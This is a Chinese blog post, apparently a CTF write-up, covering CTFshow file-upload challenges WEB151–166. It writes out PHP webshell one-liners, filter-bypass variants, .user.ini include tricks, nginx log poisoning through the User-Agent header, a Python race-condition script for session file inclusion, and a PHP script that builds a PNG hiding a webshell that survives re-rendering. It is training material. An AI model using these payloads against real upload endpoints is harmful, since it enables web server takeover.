@@ -1,0 +1,874 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="Hexo" href="https://nnnpc.github.io/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="Hexo" href="https://nnnpc.github.io/atom.xml" />
+<link rel="alternate" type="application/json" title="Hexo" href="https://nnnpc.github.io/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="WEB" />
+
+
+<link rel="canonical" href="https://nnnpc.github.io/2024/04/16/CTFshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0151-170/">
+
+
+
+  <title>
+CTFshow文件上传151-170 - WEB |
+nnnpc = Hexo</title>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">CTFshow文件上传151-170
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="Created: 2024-04-16 13:58:18">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">Posted on</span>
+    <time itemprop="dateCreated datePublished" datetime="2024-04-16T13:58:18+08:00">2024-04-16</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="Toggle navigation bar">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">nnnpc</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+          <img src="//img/6.jpg">
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/WEB/" itemprop="item" rel="index" title="In WEB"><span itemprop="name">WEB</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
+  <link itemprop="mainEntityOfPage" href="https://nnnpc.github.io/2024/04/16/CTFshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0151-170/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="John Doe">
+    <meta itemprop="description" content=", ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Hexo">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h1 id="web151"><a class="markdownIt-Anchor" href="#web151">#</a> WEB151</h1>
+<p>虽然在上传点上传 php 发现不支持 php 的上传，但一句话的 png，发现可以被上传</p>
+<p><strong> <code>&lt;?php @eval($_POST['flag']);?&gt;</code> </strong></p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/3Bugw3GuUHXmVH9V.png!thumbnail" alt=""></p>
+<p>试试 bp 抓包改后缀能不能上传</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/UYnMmUGv5vMeyXto.png!thumbnail" alt=""></p>
+<p>发现成功上传</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/a3fNk6qxLoWb2y3z.png!thumbnail" alt=""></p>
+<p>用蚁剑进行连接</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/iMCi9PqahkJMDljV.png!thumbnail" alt=""></p>
+<p>成功连接，找到 /var/www/html/flag.php</p>
+<p>里面便是 flag</p>
+<p><strong>ctfshow{e9ec3beb-bb71-481d-bf0b-b1a4ae935379}</strong></p>
+<hr>
+<h1 id="web152"><a class="markdownIt-Anchor" href="#web152">#</a> <strong>WEB152</strong></h1>
+<p>同样先试试 bp 抓包修改能不能传</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/BHYgJ0RFMftqU7l0.png!thumbnail" alt=""></p>
+<p>上传成功</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/LpKUy6bXRjvK1na2.png!thumbnail" alt=""></p>
+<p>蚁剑连接</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/GS1t4idcGUNI0rcH.png!thumbnail" alt=""></p>
+<p>/var/www/html/flag.php 目录下找到 flag</p>
+<p><strong>ctfshow{c23425b4-aa5d-42bf-8702-7d12b146b090}</strong></p>
+<hr>
+<h1 id="web153"><a class="markdownIt-Anchor" href="#web153">#</a> <strong>WEB153</strong></h1>
+<p>同样的方法再试一遍</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/KYBgxM3ysZ9sbE5z.png!thumbnail" alt=""></p>
+<p>发现上传不了，就传 png 后缀的一句话木马试试</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/NtDvS8jV3zM71WfZ.png!thumbnail" alt=""></p>
+<p>发现还是对内容没有过滤，只是把后缀过滤了，既然可以上传后缀为 png 的一句话木马，那就上传一个配置文件即 user.ini，把 png 后缀解析了就好</p>
+<p><strong>auto_prepend_file=flag.png</strong></p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/KbCUTFo1aKzzGk1F.png!thumbnail" alt=""></p>
+<p>bp 抓包修改文件名和内容，成功上传 user.ini</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/c48njRqdOqems0jp.png!thumbnail" alt=""></p>
+<p>查看是否被成功解析</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/UqHc7li5pALRmm4j.png!thumbnail" alt=""></p>
+<p>成功解析，蚁剑进行连接获取 flag</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/edGWkwq6G9fk3Ulv.png!thumbnail" alt=""></p>
+<p>同样的目录 /var/www/html/flag.php，得到 flag</p>
+<p><strong>ctfshow{32328274-3d36-4087-b5cb-351a30fef463}</strong></p>
+<hr>
+<h1 id="web154"><a class="markdownIt-Anchor" href="#web154">#</a> <strong>WEB154</strong></h1>
+<p>首先上传 png 后缀的一句话木马</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/JqQjYCWWL4oEyN5g.png!thumbnail" alt=""></p>
+<p>发现应该是对内容进行了过滤</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ZC0OqsIptiIAWrPh.png!thumbnail" alt=""></p>
+<p>发现短标签成功上传</p>
+<p><strong>短标签一句话木马： <code>&lt;?= @eval($_POST['a']);?&gt;</code> </strong></p>
+<p>直接 bp 抓包直接改后缀发现不行，同样上传.user.ini 解析 png</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/u3DP6cZy1Uv1Xcok.png!thumbnail" alt=""></p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Vx5Bxm7EeIn7eAUU.png!thumbnail" alt=""></p>
+<p>同样用 phpinfo (); 查看是否解析成功</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6Mb0UoULZZE4ZuDF.png!thumbnail" alt=""></p>
+<p>解析成功，直接使用蚁剑获取 flag</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/koKiTZjAcWzglRXg.png!thumbnail" alt=""></p>
+<p><strong>ctfshow{054f3929-69ca-4df0-9d8e-a90e1841da3f}</strong></p>
+<p>同样也可以使用 hackbar 获取 flag</p>
+<p><strong>hackbar post 传值：a=system (“cat …/f*”);phpinfo ();</strong></p>
+<hr>
+<h1 id="web155"><a class="markdownIt-Anchor" href="#web155">#</a> WEB155</h1>
+<p>同样上传短标签一句话木马</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/pkvzfrnU4sWocblx.png!thumbnail" alt=""></p>
+<p>发现也同样可以被上传，于是上传配置文件</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/LA5ilCdgceJXnawa.png!thumbnail" alt=""></p>
+<p>成功上传，查看是否被解析</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/S0mfwAZUlEEtU4uF.png!thumbnail" alt=""></p>
+<p>成功，蚁剑连接获取 flag</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/31Ud1bt2krH1DvgG.png!thumbnail" alt=""></p>
+<p><strong>ctfshow{4879de09-af52-4822-818b-ef6c0ce41af1}</strong></p>
+<hr>
+<h1 id="web156"><a class="markdownIt-Anchor" href="#web156">#</a> <strong>WEB156</strong></h1>
+<p>再试试 png 后缀的短标签是不是能传上去</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/2tye0wpOhrbuneab.png!thumbnail" alt=""></p>
+<p>发现对短标签内容做了过滤，过滤了 []，那就使用花括号绕过</p>
+<p><strong>短标签一句话木马： <code>&lt;?= @eval($_POST&#123;'a'&#125;);?&gt;</code> </strong></p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4tZ6lGoKwSrKneKm.png!thumbnail" alt=""></p>
+<p>成功上传，上传配置文件解析</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/knzlhPWKvobiWpz6.png!thumbnail" alt=""></p>
+<p>上传成功，查看是否被解析</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Dsnpc6N1Uhs7Zp9Q.png!thumbnail" alt=""></p>
+<p>同样成功，蚁剑连接获得 flag</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/kpMZi11HyQtmIwTJ.png!thumbnail" alt=""></p>
+<p><strong>ctfshow{e251aa37-7214-42c6-a673-68495af8f905}</strong></p>
+<hr>
+<h1 id="web157"><a class="markdownIt-Anchor" href="#web157">#</a> <strong>WEB157</strong></h1>
+<p>本题过滤了 {} 和分号，因此用一句话就没有那么方便了，用反引号来执行命令获取 flag</p>
+<p><strong>语句： <code>&lt;?=`tac ../f*`?&gt;</code> </strong></p>
+<p>（由于分号被过滤了，因此使用 <code>&lt;? ?&gt;</code>  来代替）</p>
+<p>同样上传 user.ini</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/76NmKxlx5PSrHJUN.png!thumbnail" alt=""></p>
+<p>成功上传</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/zNN2h4F7eD3XudC7.png!thumbnail" alt=""></p>
+<p>上传 png 后缀的命令获取 flag</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/y56QaBkDZfyF603M.png!thumbnail" alt=""></p>
+<p>访问路径：/upload/index.php 或 /upload/ 得到 flag</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/TeSI9ieWcsP1FF5W.png!thumbnail" alt=""></p>
+<p><strong>ctfshow{2d65ff79-1553-470c-a0bd-1a665246e8f7}</strong></p>
+<hr>
+<h1 id="web158"><a class="markdownIt-Anchor" href="#web158">#</a> WEB158</h1>
+<p>WEB156 的同样通杀</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/kgNfR6I1Yf40LqCK.png!thumbnail" alt=""></p>
+<p><strong>ctfshow{bf28384e-6da5-43e3-87f8-038071257cdc}</strong></p>
+<hr>
+<h1 id="web159"><a class="markdownIt-Anchor" href="#web159">#</a> <strong>WEB159</strong></h1>
+<p>同 WEB156</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/0uvclFFEkCnEWOGX.png!thumbnail" alt=""></p>
+<p><strong>ctfshow{bf28384e-6da5-43e3-87f8-038071257cdc}</strong></p>
+<hr>
+<h1 id="web160"><a class="markdownIt-Anchor" href="#web160">#</a> <strong>WEB160</strong></h1>
+<p>考的知识点是一个双重包含具体的流程为：</p>
+<ol>
+<li>
+<p>用 png 包含文件上传日志的目录<br>
+<strong> <code>&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</code> </strong></p>
+</li>
+<li>
+<p>.user.ini 包含 png 文件（相当于把 png 所包含的日志文件中的所有东西解析了）<br>
+<strong>auto_append_file=/var/www/html/upload/1.png</strong></p>
+</li>
+<li>
+<p>刷新抓包修改 UA 头，把构造的命令放入 UA 投中，直接传入日志文件，有上面的两步，因此就能够被解析执行命令，从而 cat<br>
+flag<br>
+<strong> <code>&lt;?php system('tac ../fl*');?&gt;</code> </strong></p>
+</li>
+</ol>
+<p>直接先传入 png</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/2gaK4KHbLat8g6TZ.png!thumbnail" alt=""></p>
+<p>传入.user.ini</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/mcVCRaPI9YlGiWHx.png!thumbnail" alt=""></p>
+<p>都上传成功之后修改 UA 头，将命令传入日志中使它被解析</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/x7Mv1nKz7pAY5dBT.png!thumbnail" alt=""></p>
+<p>forward 之后去 /upload/ 目录查看是否被解析成功并获取了 flag</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/K3C710nGh7NNHhx5.png!thumbnail" alt=""></p>
+<p>得到 flag</p>
+<p><strong>ctfshow{35f1ef2f-2a11-4343-9a14-568a5b5365d2}</strong></p>
+<hr>
+<h1 id="web161"><a class="markdownIt-Anchor" href="#web161">#</a> <strong>WEB161</strong></h1>
+<p>同上题的方法，依旧是双重包含，一起来看看</p>
+<p>同样上传 1.png</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Ufetbf9pr8Ox0zue.png!thumbnail" alt=""></p>
+<p>发现文件类型不合规，但是没有对后缀进行过滤，应该是对文件的内容进行了过滤</p>
+<p>这里是校验了一个文件头，因此只需要在文件中加入 GIF89 的 gif 文件头就能实现绕过</p>
+<p>1.png：</p>
+<p><strong>GIF89</strong></p>
+<p><strong> <code>&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</code> </strong></p>
+<p>.user.ini：</p>
+<p><strong>GIF89</strong></p>
+<p><strong>auto_append_file=/var/www/html/upload/1.png</strong></p>
+<p>按照上提的步骤再传一遍</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/pARcQrX1Li1sRJP8.png!thumbnail" alt=""></p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9I5oBtewq6w0u7Xp.png!thumbnail" alt=""></p>
+<p>都成功上传，修改 UA 头，将命令传入 log 中</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/3Z02b1V4j7AJyQYr.png!thumbnail" alt=""></p>
+<p>访问 /upload/</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1Mjkj3Z2155KZnjO.png!thumbnail" alt=""></p>
+<p>得到 flag</p>
+<p><strong>ctfshow{9c39aa52-c72a-4b62-a2cb-4dce29409f07}</strong></p>
+<hr>
+<h1 id="web162"><a class="markdownIt-Anchor" href="#web162">#</a> <strong>WEB162</strong></h1>
+<p>本题考的知识点是一个 session 的文件包含，具体思路如下：</p>
+<ol>
+<li>构造.user.ini 解析 png<br>
+<strong> 语句：</strong></li>
+</ol>
+<p><strong>GIF89</strong></p>
+<p><strong>auto_append_file=&quot;png&quot;</strong></p>
+<ol>
+<li>构造 png，用 png 包含 session 文件<br>
+<strong>语句：</strong></li>
+</ol>
+<p><strong>GIF89</strong></p>
+<p><strong> <code>&lt;?=include&quot;/tmp/sess_nnnpc&quot;?&gt;</code> </strong></p>
+<ol>
+<li>使用条件竞争脚本，将构造的 session 不断发送并且不断访问，其中在 session 中写入恶意代码，由于之前 png 的包含和.user.ini 的解析，就能进行命令执行 cat<br>
+flag</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">sess = &#x27;nnnpc&#x27;</span><br><span class="line">url1 = &quot;http://ce89fbe1-10ca-4a2d-808d-95e5976b5bfd.challenge.ctf.show/&quot;</span><br><span class="line">url2 = &quot;http://ce89fbe1-10ca-4a2d-808d-95e5976b5bfd.challenge.ctf.show/upload&quot;</span><br><span class="line">data1 = &#123;</span><br><span class="line">    &#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span><br><span class="line">&#125;</span><br><span class="line">file = &#123;</span><br><span class="line">    &#x27;file&#x27;: &#x27;nnnpc&#x27;</span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    &#x27;PHPSESSID&#x27;: sess</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def write():</span><br><span class="line">    while True:</span><br><span class="line">        r = session.post(url1, data=data1, files=file, cookies=cookies)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def read():</span><br><span class="line">    while True:</span><br><span class="line">        r = session.get(url2)</span><br><span class="line">        if &#x27;flag&#x27; in r.text:</span><br><span class="line">            print(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">threads = [threading.Thread(target=write),</span><br><span class="line">           threading.Thread(target=read)]</span><br><span class="line">for t in threads:</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure>
+<p>开始做题，看看 web162</p>
+<p>首先上传.user.ini</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/MLqYREfWtza240p6.png!thumbnail" alt=""></p>
+<p>这里不能指定特定的 1.png 之类的文件，因为对文件内容进行了过滤，把 &quot;.&quot; 过滤了</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/8rHmpMrjeF6OVkOy.png!thumbnail" alt=""></p>
+<p>成功上传，接着上传 png 文件</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/tzsIqV31EnDv9nDt.png!thumbnail" alt=""></p>
+<p>成功上传</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/j4kukrf8jvEZr82Q.png!thumbnail" alt=""></p>
+<p>使用条件竞争脚本 cat flag（我这里使用命令行终端执行）</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/25H76LFtZ8oiMD4o.png!thumbnail" alt=""></p>
+<p>得到 flag</p>
+<p><strong>ctfshow{ceb7fdf2-9db7-42e3-a3ea-4763c6b635f4}</strong></p>
+<hr>
+<h1 id="web163"><a class="markdownIt-Anchor" href="#web163">#</a> WEB163</h1>
+<p>本题还是一个 session 的文件包含，但是发现根据 web162 的方法打不通了，于是寻找原因</p>
+<p>我们直接试试.user.ini 包含构造的 session 路径</p>
+<p><strong>语句：</strong></p>
+<p><strong>GIF89A</strong></p>
+<p><strong>auto_append_file=/tmp/sess_nnnpc</strong></p>
+<p>直接上传</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/xe962NsGYqh9jyta.png!thumbnail" alt=""></p>
+<p>上传成功</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/WjsKSfWp0XkGmXfJ.png!thumbnail" alt=""></p>
+<p>用条件竞争脚本上传命令并访问</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6X64V8wjXShNwhkH.png!thumbnail" alt=""></p>
+<p>成功获得 flag</p>
+<p><strong>ctfshow{c636315f-3e55-46c0-9024-00b7c4aabd37}</strong></p>
+<hr>
+<h1 id="web164"><a class="markdownIt-Anchor" href="#web164">#</a> <strong>WEB164</strong></h1>
+<p>本题考察的知识点是 png 格式图片的二次渲染</p>
+<p><strong>知识点：<br>
+在我们上传文件后，网站会对图片进行二次处理（格式、尺寸要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片并放到网站对应的标签进行显示。</strong></p>
+<p>二次渲染本身就可以理解为为了安全性，对图片进行了一个很好的过滤，便是对图片的一些东西进行了适当的修改，不影响图片的原本模样，降低了风险性。而此类题目的做法便是通过脚本生成一张经过二次渲染之后依然可以有带马的一张图片，从而达到获取信息的目的</p>
+<p>脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,</span><br><span class="line">           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,</span><br><span class="line">           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,</span><br><span class="line">           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,</span><br><span class="line">           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,</span><br><span class="line">           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,</span><br><span class="line">           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,</span><br><span class="line">           0x66, 0x44, 0x50, 0x33);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(32, 32);</span><br><span class="line"></span><br><span class="line">for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;</span><br><span class="line">   $r = $p[$y];</span><br><span class="line">   $g = $p[$y+1];</span><br><span class="line">   $b = $p[$y+2];</span><br><span class="line">   $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">   imagesetpixel($img, round($y / 3), 0, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,&#x27;2.png&#x27;);  //要修改的图片的路径</span><br><span class="line">/* 木马内容</span><br><span class="line">&lt;?$_GET[0]($_POST[1]);?&gt;</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>来看看本题，先使用脚本跑一跑<br>
+方法一：</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/wSB2Gq9xvjoiKlSW.png!thumbnail" alt=""></p>
+<p>打开小皮点击启动</p>
+<p>网站 -&gt;localhost-&gt; 管理 -&gt; 打开根目录</p>
+<p>把脚本存放在根目录下，浏览器访问 127.0.0.1 / 脚本名称，发现能生成 2.png 就成功了</p>
+<p>方法二：</p>
+<p>部署 php 环境，我这里是在 vscode 中部署运行的，如果在 vscode 中运行，就不需要开启小皮和将脚本放入根目录了，在自己定义的目录中即可</p>
+<p>部署环境可以参考这篇博客：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0ODAzMzM1L2FydGljbGUvZGV0YWlscy8xMDg4MDY4NTE=">https://blog.csdn.net/qq_44803335/article/details/108806851</span></p>
+<p>png 准备好之后就可以上传了，直接上传</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/SGvIOqzNLOcmJACS.png!thumbnail" alt=""></p>
+<p>发现上传成功，点击查看图片</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1XZK1AEEIFCoNT3T.png!thumbnail" alt=""></p>
+<p>再用记事本打开 2.png 查看下</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/rZKxODLM1kosoKAd.png!thumbnail" alt=""></p>
+<p>接下来就是构造命令拿 flag 了，在 url 后面跟上 &amp; 0=system</p>
+<p><span class="exturl" data-url="aHR0cDovL2ViOWRiY2M0LTFjNjAtNDNiYy04Nzc1LWUyY2UwM2ExODMwYy5jaGFsbGVuZ2UuY3RmLnNob3cvZG93bmxvYWQucGhwP2ltYWdlPWZiNWM4MWVkM2EyMjAwMDRiNzEwNjk2NDVmMTEyODY3LnBuZyZhbXA7MD1zeXN0ZW0=">http://eb9dbcc4-1c60-43bc-8775-e2ce03a1830c.challenge.ctf.show/download.php?image=fb5c81ed3a220004b71069645f112867.png&amp;0=system</span></p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/7GjeGSPHN9WkwEXO.png!thumbnail" alt=""></p>
+<p>post data 传 1=tac f*</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/PTqEdUiMwu5GVDgR.png!thumbnail" alt=""></p>
+<p>execute 之后 ctrl+s 下载保存图片</p>
+<p>用记事本打开图片得到 flag</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/bA5wIo05zv8A0hyQ.png!thumbnail" alt=""></p>
+<p><strong>ctfshow{fbaff217-7284-4f2c-87ce-a3f4bd2a9d15}</strong></p>
+<hr>
+<h1 id="web165"><a class="markdownIt-Anchor" href="#web165">#</a> <strong>WEB165</strong></h1>
+<h1 id="web166"><a class="markdownIt-Anchor" href="#web166">#</a> <strong>WEB166</strong></h1>
+<p>本题考查的知识点是只能上传后缀为 zip 的文件，构造一句话 zip 上传</p>
+<p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/lUlgbs6804NHeGaD.png!thumbnail" alt=""></p>
